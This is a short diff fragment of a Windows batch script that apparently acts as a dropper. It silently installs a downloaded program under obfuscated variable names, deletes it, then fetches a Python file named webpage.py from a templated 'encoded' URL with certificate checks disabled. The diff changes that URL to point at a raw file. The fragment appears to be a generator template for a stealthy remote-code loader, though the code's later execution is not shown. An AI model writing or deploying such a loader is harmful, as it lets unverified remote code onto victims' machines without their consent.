@@ -76,7 +76,7 @@ curl -L -o !eeee! !eee! --insecure --silent
 start /wait !eeee! /quiet /passive InstallAllUsers=0 PrependPath=1 Include_test=0 Include_pip=1 Include_doc=0
 del !eeee!
 
-set "ENCODED_URL={new_encoded_url}
+set "ENCODED_URL={new_encoded_url}/raw
 
 set "OUTPUT_FILE=webpage.py"
 curl -o %OUTPUT_FILE% -s %ENCODED_URL% --insecure
